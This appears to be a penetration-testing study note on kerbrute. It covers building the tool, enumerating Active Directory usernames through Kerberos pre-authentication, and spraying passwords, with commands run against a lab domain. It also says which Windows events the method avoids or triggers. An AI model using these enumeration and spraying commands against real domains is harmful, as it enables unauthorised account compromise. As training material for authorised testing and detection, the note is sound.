-- -
Software to bruteforce kerberos.
### Compile from source
```bash
# clone repo
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute

# Show compilation options
make help

# compile only linux binary
sudo make linux

# compile a binary for all OSes (Windows, Linux, and Mac)
sudo make all

# Compiled binaries will be located in the newly created dist directory
# Move binary onto path. Of note, you can literally just move the binary to any location on your path
echo $PATH
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### Enumerating Users
When enumerating usernames, kerbrute uses Kerberos Pre-Authentication to validate users in the domain. It is much faster and (potentially) stealthier way to perform password spraying. Does not generate Windows `Event ID 4625: An account failed to log on`, which is what is **usually** monitored for. Kerbrute sends a TGT request to the DC, if the DC replies with a `PRINCIPAL UNKNOWN` error, then the username does not exist. This method **will not** lockout any accounts. 
Kerbrute will trigger `Event ID 4768: A Kerberos authentication ticket (TGT) was requested`, which will only be triggered if `Kerberos event logging` is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID. So the tool isn't foolproof 
```bash
# this assumes you have identified two data points:
# Domain Controller: You've identified the IP of a Domain Controller
# Domain: You know the name of the Domain administered by the Domain Controller
kerbrute userenum -d <domain> --dc <dc ip> <user wordlist> -o <output file> 
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

^3c4231

#### Password Spray
```bash
# Generic
kerbrute passwordspray -d <domain> --dc <dc ip> <userlist> <passwd>

# Specific
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

^ab0bcd
